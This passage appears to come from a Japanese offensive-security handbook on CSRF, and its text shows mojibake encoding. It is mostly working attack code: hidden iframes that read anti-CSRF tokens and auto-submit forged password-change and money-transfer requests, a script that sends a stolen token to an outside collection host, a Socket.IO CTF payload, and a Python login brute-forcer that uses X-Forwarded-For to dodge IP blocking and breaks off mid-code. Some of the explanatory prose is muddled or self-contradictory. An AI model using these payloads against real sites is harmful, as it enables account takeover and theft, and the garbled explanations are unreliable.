CSRFï¼ˆCross-Site Request Forgeryï¼‰æ”»æ’ƒã¯ã€æ”»æ’ƒè€…ãŒè¢«å®³è€…ã®ä»£ã‚ã‚Šã«æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚ã“ã®æ”»æ’ƒã‚’è¡Œã†ãŸã‚ã«ã¯ã€è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ä»¥ä¸‹ã®æ‰‹é †ã§ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹æ–¹æ³•ã‚’èª¬æ˜ã—ã¾ã™ã€‚

1. æ”»æ’ƒè€…ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«iframeã‚’åŸ‹ã‚è¾¼ã¿ã¾ã™ã€‚ã“ã®iframeã¯ã€è¢«å®³è€…ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚

```html
<iframe src="https://victim-website.com"></iframe>
```

2. iframeå†…ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€è¢«å®³è€…ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã¾ã™ã€‚

```javascript
var csrfToken = document.querySelector('input[name="csrf_token"]').value;
```

3. æ”»æ’ƒè€…ã¯ã€å–å¾—ã—ãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€æ‚ªæ„ã®ã‚ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã®ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½œæˆã—ã¾ã™ã€‚

```html
<form id="malicious-form" action="https://victim-website.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacker-password">
  <input type="hidden" name="csrf_token" value="">
</form>
```

4. ãƒ•ã‚©ãƒ¼ãƒ ã®CSRFãƒˆãƒ¼ã‚¯ãƒ³ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«ã€å–å¾—ã—ãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¨­å®šã—ã¾ã™ã€‚

```javascript
document.querySelector('#malicious-form input[name="csrf_token"]').value = csrfToken;
```

5. æ”»æ’ƒè€…ã¯ã€ãƒ•ã‚©ãƒ¼ãƒ ã‚’è‡ªå‹•çš„ã«é€ä¿¡ã™ã‚‹ãŸã‚ã«ã€JavaScriptã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```javascript
document.getElementById('malicious-form').submit();
```

6. ã¾ãŸã¯ã€Ajaxã‚’ä½¿ç”¨ã—ã¦æ‚ªæ„ã®ã‚ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://victim-website.com/change-password', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('new_password=hacker-password&csrf_token=' + csrfToken);
```

ä»¥ä¸Šã®æ‰‹é †ã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä¹—ã£å–ã‚Šã€æ‚ªæ„ã®ã‚ã‚‹ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è¢«å®³è€…ã¯ã€æ”»æ’ƒãŒç™ºç”Ÿã—ãŸã“ã¨ã«æ°—ä»˜ã‹ãšã«ã€æ„å›³ã—ãªã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ã¦ã—ã¾ã†å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€iframeã¨ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

CSRFï¼ˆCross-Site Request Forgeryï¼‰æ”»æ’ƒã¯ã€æ”»æ’ƒè€…ãŒè¢«å®³è€…ã®ä»£ã‚ã‚Šã«æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚ã“ã®æ”»æ’ƒã‚’è¡Œã†ãŸã‚ã«ã¯ã€è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ä»¥ä¸‹ã®æ‰‹é †ã§CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€iframeã¨ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

1. æ”»æ’ƒè€…ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’ä½œæˆã—ã¾ã™ã€‚ã“ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã¯ã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã®ãƒ•ã‚©ãƒ¼ãƒ ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

2. æ”»æ’ƒè€…ã¯ã€è¢«å®³è€…ã‚’èª˜å°ã—ã¦æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’è¨ªã‚Œã•ã›ã¾ã™ã€‚è¢«å®³è€…ãŒã“ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’è¨ªã‚Œã‚‹ã¨ã€æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã«å¯¾ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚

3. æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã¯ã€è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ãªã‚Šã™ã¾ã—ã€æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

4. æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã¯ã€ç›—ã‚“ã CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦æ„å›³ã—ãªã„POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ã“ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯ã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«å¯¾ã—ã¦é€ä¿¡ã•ã‚Œã¾ã™ã€‚

ä»¥ä¸Šã®æ‰‹æ³•ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä¹—ã£å–ã‚Šã€æ„å›³ã—ãªã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è¢«å®³è€…ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãªã„ã‚ˆã†ã«æ³¨æ„ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³é–‹ç™ºè€…ã¯ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã®é©åˆ‡ãªå®Ÿè£…ã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’è¡Œã†ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€2ã¤ã®iframeã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã™ã‚‹**

In this technique, we will exploit a Cross-Site Request Forgery (CSRF) vulnerability to steal a user's token and send it to an attacker-controlled server using two iframes.

ã“ã®æŠ€è¡“ã§ã¯ã€Cross-Site Request Forgeryï¼ˆCSRFï¼‰ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€2ã¤ã®iframeã‚’ä½¿ç”¨ã—ã¦æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã—ã¾ã™ã€‚

First, we need to identify a vulnerable website that is susceptible to CSRF attacks. Once we have found a target, we can proceed with the following steps:

ã¾ãšã€CSRFæ”»æ’ƒã®å½±éŸ¿ã‚’å—ã‘ã‚„ã™ã„è„†å¼±ãªã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’ç‰¹å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚’è¦‹ã¤ã‘ãŸã‚‰ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

1. Create a malicious webpage that contains two iframes. The first iframe will load the target website, and the second iframe will load an attacker-controlled webpage.

   1. 2ã¤ã®iframeã‚’å«ã‚€æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’ä½œæˆã—ã¾ã™ã€‚æœ€åˆã®iframeã¯ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‚’èª­ã¿è¾¼ã¿ã€2ç•ªç›®ã®iframeã¯æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’èª­ã¿è¾¼ã¿ã¾ã™ã€‚

2. In the first iframe, we will inject JavaScript code to extract the user's token from the target website. This can be done by accessing the DOM elements that contain the token and extracting its value.

   2. æœ€åˆã®iframeã«ã¯ã€JavaScriptã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ã¦ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŠ½å‡ºã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å«ã‚€DOMè¦ç´ ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ãã®å€¤ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ã§å®Ÿç¾ã§ãã¾ã™ã€‚

3. Once we have obtained the token, we will use JavaScript to send it to the attacker-controlled server. This can be done by making a POST request to the server with the token as a parameter.

   3. ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ãŸã‚‰ã€JavaScriptã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚’æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨ã—ã¦ã‚µãƒ¼ãƒãƒ¼ã«POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã“ã¨ã§å®Ÿç¾ã§ãã¾ã™ã€‚

4. The second iframe will be used to hide the malicious activity from the user. It can be set to a small size or positioned off-screen so that the user is unaware of its presence.

   4. 2ç•ªç›®ã®iframeã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æ‚ªæ„ã®ã‚ã‚‹æ´»å‹•ã‚’éš ã™ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚å°ã•ãªã‚µã‚¤ã‚ºã«è¨­å®šã™ã‚‹ã‹ã€ç”»é¢å¤–ã«é…ç½®ã™ã‚‹ã“ã¨ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãã®å­˜åœ¨ã«æ°—ä»˜ã‹ãªã„ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

By loading the malicious webpage containing the iframes, the user's token will be stolen and sent to the attacker-controlled server without their knowledge.

iframeã‚’å«ã‚€æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒˆãƒ¼ã‚¯ãƒ³ãŒç›—ã¾ã‚Œã€å½¼ã‚‰ã®çŸ¥è­˜ã‚’æŒãŸãšã«æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡ã•ã‚Œã¾ã™ã€‚
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ajaxã‚’ä½¿ç”¨ã—ã¦CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€ãƒ•ã‚©ãƒ¼ãƒ ã§POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**

```html
<script>
    // CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆ
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/get-csrf-token', true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var csrfToken = xhr.responseText;

            // ç›—ã‚“ã CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½œæˆ
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = '/transfer-money';

            // ç›—ã‚“ã CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒ•ã‚©ãƒ¼ãƒ ã«è¿½åŠ 
            var csrfInput = document.createElement('input');
            csrfInput.type = 'hidden';
            csrfInput.name = 'csrf_token';
            csrfInput.value = csrfToken;
            form.appendChild(csrfInput);

            // é€ä¿¡ã™ã‚‹ãƒ‡ãƒ¼ã‚¿ã‚’ãƒ•ã‚©ãƒ¼ãƒ ã«è¿½åŠ 
            var amountInput = document.createElement('input');
            amountInput.type = 'hidden';
            amountInput.name = 'amount';
            amountInput.value = '1000000';
            form.appendChild(amountInput);

            // ãƒ•ã‚©ãƒ¼ãƒ ã‚’bodyã«è¿½åŠ ã—ã¦è‡ªå‹•çš„ã«é€ä¿¡
            document.body.appendChild(form);
            form.submit();
        }
    };
    xhr.send();
</script>
```

ã“ã®æ”»æ’ƒã§ã¯ã€Ajaxã‚’ä½¿ç”¨ã—ã¦ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€ãã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½œæˆã—ã€POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ‚ªæ„ã®ã‚ã‚‹ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸå ´åˆã«ã“ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€Ajaxãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã¾ã™ã€‚å–å¾—ã—ãŸãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ãƒ•ã‚©ãƒ¼ãƒ ã®éš ã—ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«è¿½åŠ ã•ã‚Œã¾ã™ã€‚ãã®å¾Œã€ãƒ•ã‚©ãƒ¼ãƒ ã¯è‡ªå‹•çš„ã«é€ä¿¡ã•ã‚Œã€æ”»æ’ƒè€…ãŒæŒ‡å®šã—ãŸã‚¢ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆã“ã®å ´åˆã¯`/transfer-money`ï¼‰ã«POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚

ã“ã®æ”»æ’ƒã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®åå‰ã§æ‚ªæ„ã®ã‚ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯æ”»æ’ƒãŒè¡Œã‚ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ°—ä»˜ã‹ãšã«ã€è‡ªåˆ†ã®æ„å›³ã—ãªã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒå®Ÿè¡Œã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IOã‚’ä½¿ç”¨ã—ãŸCSRF

Socket.IOã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãªåŒæ–¹å‘é€šä¿¡ã‚’å®Ÿç¾ã™ã‚‹ãŸã‚ã®JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§ã™ã€‚Socket.IOã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãªé€šä¿¡ã‚’è¡Œã†Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€CSRFï¼ˆCross-Site Request Forgeryï¼‰æ”»æ’ƒã®æ½œåœ¨çš„ãªè„†å¼±æ€§ã«ã•ã‚‰ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

CSRFæ”»æ’ƒã¯ã€æ”»æ’ƒè€…ãŒè¢«å®³è€…ã®ä»£ã‚ã‚Šã«æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€è¢«å®³è€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚„ãƒ‡ãƒ¼ã‚¿ã‚’ä¹—ã£å–ã‚‹æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚Socket.IOã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’é©åˆ‡ã«å®Ÿè£…ã™ã‚‹ã“ã¨ã§ã€ã“ã®æ”»æ’ƒã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚

Socket.IOã§ã¯ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼ã®é–“ã§ã‚„ã‚Šå–ã‚Šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®æ‰‹é †ã§CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å®Ÿè£…ã—ã¾ã™ã€‚

1. ã‚µãƒ¼ãƒãƒ¼å´ã§ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ã”ã¨ã«ä¸€æ„ã®CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã—ã¾ã™ã€‚
2. ã‚µãƒ¼ãƒãƒ¼ã¯ã€Socket.IOã®æ¥ç¶šæ™‚ã«ç”Ÿæˆã•ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã—ã¾ã™ã€‚
3. ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯ã€å—ã‘å–ã£ãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä¿æŒã—ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹éš›ã«ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å«ã‚ã¾ã™ã€‚
4. ã‚µãƒ¼ãƒãƒ¼ã¯ã€å—ã‘å–ã£ãŸãƒªã‚¯ã‚¨ã‚¹ãƒˆã®CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼ã—ã€æ­£å½“ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‹ã©ã†ã‹ã‚’åˆ¤æ–­ã—ã¾ã™ã€‚

ã“ã®ã‚ˆã†ã«CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å®Ÿè£…ã™ã‚‹ã“ã¨ã§ã€Socket.IOã‚’ä½¿ç”¨ã—ãŸWebã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ”»æ’ƒè€…ãŒæ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¦ã‚‚ã€æ­£å½“ãªCSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒãªã„ãŸã‚ã€ã‚µãƒ¼ãƒãƒ¼ã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ‹’å¦ã—ã¾ã™ã€‚

Socket.IOã‚’ä½¿ç”¨ã™ã‚‹éš›ã«ã¯ã€å¿…ãšCSRFãƒˆãƒ¼ã‚¯ãƒ³ã®å®Ÿè£…ã‚’è¡Œã„ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ç¢ºä¿ã—ã¾ã—ã‚‡ã†ã€‚
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRFãƒ­ã‚°ã‚¤ãƒ³ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ¼ãƒ ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã¾ãŸã€å¯èƒ½ãªIPãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆå›é¿ã®ãŸã‚ã«X-Forwarded-Forãƒ˜ãƒƒãƒ€ãƒ¼ã‚‚ä½¿ç”¨ã—ã¦ã„ã¾ã™ï¼‰ã€‚
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
